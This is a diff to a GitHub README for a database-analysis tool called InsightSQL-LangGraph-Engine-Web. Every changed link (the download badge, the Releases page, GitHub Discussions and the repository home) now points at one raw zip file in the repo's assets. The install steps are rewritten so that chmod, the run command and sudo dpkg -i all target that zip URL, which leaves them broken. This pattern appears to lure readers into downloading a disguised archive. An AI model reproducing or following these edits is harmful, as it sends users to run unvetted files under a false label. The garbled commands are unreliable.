@@ -1,6 +1,6 @@
 # 🔍 InsightSQL-LangGraph-Engine-Web - Analyze Databases with Ease
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/releases)
+[![Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip%20Release-brightgreen)](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, please ensure your computer meets the following requirements:
 
 To get started, visit our Releases page to download the application:
 
-[Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/releases)
+[Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip)
 
 1. Click the link above to access our Releases page.
 2. Find the latest version, which is marked as “Latest Release.”
@@ -51,15 +51,15 @@ Once the download is complete, follow these steps based on your operating system
 
 1. Locate the downloaded file. If using the `.AppImage`, you might need to make it executable first. Open a terminal and run:
    ```
-   chmod +x /path/to/InsightSQL.AppImage
+   chmod +x https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip
    ```
 2. To run the application, simply double-click the file or use the terminal:
    ```
-   ./InsightSQL.AppImage
+   https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip
    ```
 3. If you downloaded a `.deb` file, install it using the following command:
    ```
-   sudo dpkg -i InsightSQL-LangGraph-Engine-Web.deb
+   sudo dpkg -i https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip
    ```
 
 ## 🔄 How to Use InsightSQL-LangGraph-Engine-Web
@@ -86,7 +86,7 @@ Once you open the application, you'll be greeted by a simple interface. Here’s
 
 ## 🧑‍🤝‍🧑 Support and Feedback
 
-If you need assistance or want to provide feedback, please visit our [GitHub Discussions](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/discussions) page. Join our community to share ideas, ask questions, or report issues.
+If you need assistance or want to provide feedback, please visit our [GitHub Discussions](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip) page. Join our community to share ideas, ask questions, or report issues.
 
 ## 📜 License
 
@@ -107,6 +107,6 @@ This project covers valuable topics such as:
 - sql-agent
 - streamlit
 
-For more details, visit our [GitHub repository](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web).
+For more details, visit our [GitHub repository](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip).
 
-[Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/releases) and start analyzing your databases today!
+[Download the latest release](https://github.com/Leandruo/InsightSQL-LangGraph-Engine-Web/raw/refs/heads/main/assets/Web-Engine-SQ-Lang-Insight-Graph-2.5.zip) and start analyzing your databases today!
